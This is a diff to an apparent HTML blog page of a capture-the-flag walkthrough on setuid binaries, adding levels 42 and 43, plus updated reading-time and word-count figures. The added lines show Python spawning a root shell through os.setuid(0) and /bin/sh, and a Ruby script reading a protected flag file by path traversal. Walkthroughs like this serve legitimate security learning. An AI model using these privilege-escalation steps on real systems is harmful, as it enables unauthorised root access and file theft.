@@ -325,7 +325,7 @@
 
 
                 <time class="article-time--reading">
-                    4 minute read
+                    5 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -336,7 +336,7 @@
 
 
                 <time class="article-words">
-                    1918 字
+                    2015 字
                 </time>
             </div>
         
@@ -889,6 +889,43 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
 </span></span><span class="line"><span class="cl"><span class="c1">#-e:can make the Perl program run in the terminal</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>level 42: <strong>python</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python -c print<span class="o">(</span>open<span class="o">(</span><span class="s2">&#34;flag&#34;</span><span class="o">)</span>.read<span class="o">())</span> <span class="c1">#can read the flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">&gt;&gt;import os
+</span></span><span class="line"><span class="cl">&gt;&gt;os.setuid<span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&gt;&gt;os.system<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="o">)</span>	<span class="c1">#getshell!!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 43: <strong>ruby</strong></p>
+<p><strong>Direct use of the command line will have a security warning, so it can only be written script execution file to read the flag.</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ruby -e <span class="s1">&#39;puts File.read(&#34;flag&#34;)&#39;</span> <span class="c1">#can&#39;t read the flag--&gt;ruby: no -e allowed while running setuid (SecurityError)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#use the scripts</span>
+</span></span><span class="line"><span class="cl">touch hack.rb <span class="c1">#it have no permission in the / directory</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;puts File.read(&#34;../../flag&#34;)&#39;</span> &gt; hack.rb <span class="c1">#&#39;../../&#39; is the critical!</span>
+</span></span><span class="line"><span class="cl">ruby hack.rb <span class="c1">#can read the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -965,7 +1002,7 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
         
             
         
-        共 2.25k 字 · 共 3篇文章
+        共 2.35k 字 · 共 3篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
             <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
